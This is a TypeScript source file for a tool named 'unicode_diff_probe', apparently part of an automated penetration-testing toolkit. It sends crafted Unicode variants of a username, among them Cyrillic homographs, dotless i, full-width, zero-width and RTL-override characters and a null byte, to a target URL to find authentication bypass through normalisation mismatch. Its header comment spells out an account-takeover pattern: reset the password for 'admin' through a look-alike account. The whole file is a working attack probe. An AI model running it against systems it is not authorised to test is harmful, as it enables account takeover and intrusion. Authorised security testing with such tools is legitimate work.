// T34 — unicode_diff_probe
// Probes for Unicode normalisation divergence between layers.
// NFC/NFKC case-fold, Turkish-i, IDN, RTL override, Cyrillic homographs.
// Classic pattern: register "аdmin" (Cyrillic а), reset password for "admin".

import { ToolDefinition, ToolResult } from '../types';
import { CommandExecutor } from '../executor';

const definition: ToolDefinition = {
  name: 'unicode_diff_probe',
  description:
    'Probe for Unicode normalisation divergence. Sends crafted strings exploiting NFC→NFKC ' +
    'case-fold differences, Turkish-i (ı→i), full-width digits, ZWJ, RTL override, Cyrillic ' +
    'homographs, and IDN labels. Detects auth bypass via normalisation mismatch between the ' +
    'allow-list layer and the business-logic layer.',
  status: 'available',
  version: '1.0.0',
  parameters: [
    { name: 'url',        type: 'string', required: true,  description: 'Target URL' },
    { name: 'method',     type: 'string', required: false, description: 'HTTP method', default: 'POST' },
    { name: 'field',      type: 'string', required: false, description: 'Field name to inject (default: username)', default: 'username' },
    { name: 'value',      type: 'string', required: false, description: 'Base value to mutate (default: admin)', default: 'admin' },
    { name: 'headers',    type: 'string', required: false, description: 'JSON extra headers' },
    { name: 'timeout_ms', type: 'number', required: false, description: 'Per-request timeout ms', default: 8000 },
  ],
};

function buildVariants(value: string): Array<{ name: string; mutated: string }> {
  return [
    // Cyrillic homographs (letters that look identical to ASCII)
    { name: 'cyrillic_a',         mutated: value.replace(/a/g, 'а') },   // U+0430
    { name: 'cyrillic_e',         mutated: value.replace(/e/g, 'е') },   // U+0435
    { name: 'cyrillic_o',         mutated: value.replace(/o/g, 'о') },   // U+043E
    { name: 'cyrillic_p',         mutated: value.replace(/p/g, 'р') },   // U+0440
    // Turkish dotless i
    { name: 'turkish_i',          mutated: value.replace(/i/g, 'ı') },   // U+0131
    // Full-width
    { name: 'fullwidth',          mutated: [...value].map(c => {
        const code = c.charCodeAt(0);
        return (code >= 0x21 && code <= 0x7e) ? String.fromCharCode(code + 0xFEE0) : c;
      }).join('') },
    // Zero-width joiner injection
    { name: 'zwj_injection',      mutated: value.split('').join('‍') },
    // RTL override
    { name: 'rtl_override',       mutated: '‮' + value },
    // NFKC normalisation (fi ligature, etc.)
    { name: 'nfkc_ligature',      mutated: value.replace(/fi/g, 'ﬁ').replace(/fl/g, 'ﬂ') },
    // NFC combinator (á = a + combining acute)
    { name: 'nfc_combinator',     mutated: value.replace(/a/g, 'á') },
    // Mixed case with Unicode toUpperCase tricks
    { name: 'unicode_upper',      mutated: value.toUpperCase() },
    { name: 'unicode_lower',      mutated: value.toLowerCase() },
    // Null byte
    { name: 'null_byte',          mutated: value + '\x00' },
    // Overlong UTF-8 representation (as string literal)
    { name: 'extra_dot',          mutated: value + '.' },
    // Padding with invisible chars
    { name: 'zero_width_space',   mutated: value + '​' },
    { name: 'zero_width_nbsp',    mutated: '﻿' + value },
  ];
}

export const unicodeDiffProbeTool = {
  definition,
  async execute(params: Record<string, unknown>, _exec: CommandExecutor): Promise<ToolResult> {
    const url = String(params.url || '');
    const method = String(params.method || 'POST').toUpperCase();
    const field = String(params.field || 'username');
    const value = String(params.value || 'admin');
    const timeoutMs = Number(params.timeout_ms || 8000);

    if (!url) return { output: 'url required', parsed: { error: 'missing_url' } };

    let headers: Record<string, string> = { 'User-Agent': 'Mozilla/5.0 GENESIS/4.0', 'Content-Type': 'application/json' };
    try { if (params.headers) Object.assign(headers, JSON.parse(String(params.headers))); } catch { /* ignore */ }

    const variants = buildVariants(value);
    const results: Array<{ name: string; mutated: string; status: number; body_excerpt: string; time_ms: number; interesting?: boolean; error?: string }> = [];

    // Baseline
    let baselineStatus = 0;
    try {
      const r = await fetch(url, { method, headers, body: JSON.stringify({ [field]: value }) });
      baselineStatus = r.status;
    } catch { /* ignore */ }

    for (const v of variants) {
      if (v.mutated === value) continue; // skip identity mutations
      const start = Date.now();
      try {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), timeoutMs);
        const body = JSON.stringify({ [field]: v.mutated });
        const resp = await fetch(url, { method, headers, body, signal: controller.signal });
        clearTimeout(timer);
        const text = await resp.text();
        const interesting = resp.status !== baselineStatus;
        results.push({ name: v.name, mutated: Buffer.from(v.mutated).toString('hex').substring(0, 20), status: resp.status, body_excerpt: text.substring(0, 80).replace(/\s+/g, ' '), time_ms: Date.now() - start, interesting });
      } catch (err) {
        results.push({ name: v.name, mutated: v.mutated.substring(0, 20), status: 0, body_excerpt: '', time_ms: Date.now() - start, error: String(err) });
      }
    }

    const interesting = results.filter(r => r.interesting);
    const lines = [
      `unicode_diff_probe — ${variants.length} Unicode variants of "${value}" on field "${field}"`,
      `Baseline status: ${baselineStatus}  |  Interesting (status divergence): ${interesting.length}`,
      '─'.repeat(72),
    ];
    for (const r of results) {
      const flag = r.interesting ? '⚡ DIVERGENT' : (r.error ? '✗ ERR      ' : '  ·        ');
      lines.push(`  ${flag}  [${r.name.padEnd(22)}]  hex="${r.mutated}"  status=${r.status}${r.error ? ` err=${r.error.substring(0, 40)}` : ''}`);
    }

    return {
      output: lines.join('\n'),
      parsed: { field, base_value: value, baseline_status: baselineStatus, total: results.length, interesting_count: interesting.length, interesting, results },
    };
  },
};
